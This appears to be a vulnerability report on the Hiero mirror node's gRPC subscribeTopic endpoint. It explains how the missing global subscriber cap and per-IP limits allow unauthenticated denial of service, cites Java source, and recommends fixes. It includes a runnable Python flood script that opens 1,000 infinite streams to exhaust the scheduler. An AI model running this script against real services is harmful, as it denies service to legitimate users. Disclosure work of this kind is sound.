### Title
Unbounded Concurrent gRPC Subscriber DoS via `subscribeTopic()` — No Global Subscriber Cap or Per-Client Rate Limiting

### Summary
`ConsensusController.subscribeTopic()` accepts gRPC streams from any unauthenticated caller with no global limit on total concurrent subscribers. The only per-connection guard (`maxConcurrentCallsPerConnection = 5`) is trivially bypassed by opening many connections. The `subscriberCount` field in `TopicMessageServiceImpl` is a pure metrics gauge with no enforcement, allowing an attacker to exhaust the `boundedElastic` scheduler thread pool and the database connection pool, denying service to legitimate Hashgraph history subscribers.

### Finding Description

**Entry point — no auth, no rate limit:**

`ConsensusController.subscribeTopic()` at [1](#0-0)  immediately delegates to `topicMessageService::subscribeTopic` with no authentication check, no per-IP throttle, and no global subscriber guard.

**`subscriberCount` is metric-only, never enforced:**

`TopicMessageServiceImpl` declares `subscriberCount` as an `AtomicLong` and registers it as a Micrometer gauge: [2](#0-1) 

It is incremented/decremented via reactive hooks: [3](#0-2) 

There is **no guard** of the form `if (subscriberCount.get() >= max) return error`. The design document for `ContractLogTopicListener` describes a `canSubscribe()` check against `maxActiveSubscriptions`, but this check was never implemented for `TopicMessageServiceImpl`.

**Per-connection limit is trivially bypassed:**

`GrpcConfiguration` sets `maxConcurrentCallsPerConnection = 5` (default from `NettyProperties`): [4](#0-3) [5](#0-4) 

There is no `maxConnections`, no `maxConnectionAge`, and no IP-level throttle configured anywhere in the gRPC server. An attacker opens N TCP connections × 5 streams = 5N concurrent subscribers.

**`boundedElastic` scheduler exhaustion:**

Each subscriber schedules work on `Schedulers.boundedElastic()` in two places:

1. The safety-check polling path in `TopicMessageServiceImpl`: [6](#0-5) 

2. `SharedTopicListener.listen()` calls `publishOn(Schedulers.boundedElastic(), ...)` per subscriber: [7](#0-6) 

3. `PollingTopicListener` and `PollingTopicMessageRetriever` each create their own `Schedulers.boundedElastic()` instance: [8](#0-7) [9](#0-8) 

`Schedulers.boundedElastic()` caps at `10 × CPU cores` threads (e.g., 40 on a 4-core pod). With thousands of concurrent subscribers each scheduling periodic tasks, the internal task queue fills and tasks are rejected with `RejectedExecutionException`, causing legitimate subscriber pipelines to fail.

### Impact Explanation

Legitimate users subscribing to Hashgraph consensus history via `subscribeTopic()` are denied service: their reactive pipelines stall or error when the bounded elastic scheduler is saturated. Additionally, each subscriber drives database queries through `PollingTopicMessageRetriever` (default pool exhaustion at scale), compounding the denial. The `hiero_mirror_grpc_subscribers` Prometheus alert fires only when subscribers drop to zero — it provides no protection, only post-hoc alerting.

### Likelihood Explanation

No authentication is required. The attacker needs only network access to the gRPC port (default 5600, exposed via Kubernetes service). A single machine with a modest number of TCP connections (e.g., 200 connections × 5 streams = 1000 subscribers) is sufficient to saturate the scheduler on a typical pod. The attack is repeatable and requires no special knowledge beyond the public protobuf API definition.

### Recommendation

1. **Enforce a global subscriber cap**: Add a check in `TopicMessageServiceImpl.subscribeTopic()` that returns an error if `subscriberCount.get() >= configuredMax` before incrementing.
2. **Add per-IP connection limiting**: Configure Netty with `maxConnectionsPerIp` or use an ingress-level rate limiter (e.g., Traefik's `InFlightReq` middleware).
3. **Set a total connection limit**: Add `serverBuilder.maxConnectionIdle(...)` and a total connection cap to `GrpcConfiguration`.
4. **Isolate scheduler resources**: Use a dedicated, bounded scheduler for subscriber pipelines rather than the shared `boundedElastic` pool.

### Proof of Concept

```python
# Requires: grpcio, protobuf, hedera proto stubs
import grpc, threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "grpc-mirror-node:5600"
NUM_CONNECTIONS = 200   # × 5 streams = 1000 subscribers

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1)
        # no endTime → infinite stream
    )
    streams = []
    for _ in range(5):  # maxConcurrentCallsPerConnection default
        streams.append(stub.subscribeTopic(query))
    # Keep streams open indefinitely
    for s in streams:
        try:
            for _ in s:
                pass
        except:
            pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
# Result: boundedElastic scheduler saturated; legitimate subscribers receive
# RejectedExecutionException or indefinite stall within seconds.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L43-53)
```java
    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L67-70)
```java
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L88-91)
```java
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java (L21-26)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        return getSharedListener(filter)
                .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
                .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
                .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L31-31)
```java
    private final Scheduler scheduler = Schedulers.boundedElastic();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L41-41)
```java
        scheduler = Schedulers.boundedElastic();
```
